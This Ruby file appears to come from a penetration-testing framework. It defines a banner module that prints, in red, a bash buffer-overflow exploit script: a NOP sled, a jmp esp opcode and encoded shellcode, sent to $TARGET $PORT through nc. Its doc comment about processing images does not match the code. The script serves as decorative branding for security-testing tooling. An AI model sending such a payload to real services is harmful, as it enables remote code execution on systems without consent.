# frozen_string_literal: true

require 'colorize'

module PWN
  module Banner
    # This plugin processes images into readable text
    module JmpEsp
      # Supported Method Parameters::
      # PWN::Banner::JmpEsp.get

      public_class_method def self.get
        '
        #!/bin/bash
        nop=$(printf \'\x90%.0s\' {1..1337})
        asm_ops=\'\xff\xe4\'
        sh_code=\'\x6a\x14\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0c\x09\x11\xb5\x83\xeb\xfc\xe2\xf4\x3d\xd2\xe6\x56\x5f\x4a\x42\xdf\x0e\x80\xf0\x05\x6a\xc4\x91\xee\x52\x5b\x79\xb7\x0c\x0c\x28\xdf\x1c\x58\x41\x3c\xed\x63\x77\xed\xc1\x89\x98\xf4\x08\xba\x15\x05\x6a\xc4\x91\xf6\xbc\x6f\xdc\x35\x9f\x50\x7b\x8a\x54\xc4\x91\xfc\x75\xf1\x79\x9a\x23\x7a\x79\xdd\x23\x6b\x78\xdb\x85\xea\x41\xe6\x85\xe8\xa1\xbe\xc1\x89\x11\xb5\'
        pwn="${nop}${asm_ops}${sh_code}"
        echo -en $pwn | nc $TARGET $PORT
        '.red
      rescue StandardError => e
        raise e
      end

      # Author(s):: 0day Inc. <request.pentest@0dayinc.com>

      public_class_method def self.authors
        "AUTHOR(S):
          0day Inc. <request.pentest@0dayinc.com>
        "
      end

      # Display Usage for this Module

      public_class_method def self.help
        puts "USAGE:
          #{self}.get

          #{self}.authors
        "
      end
    end
  end
end
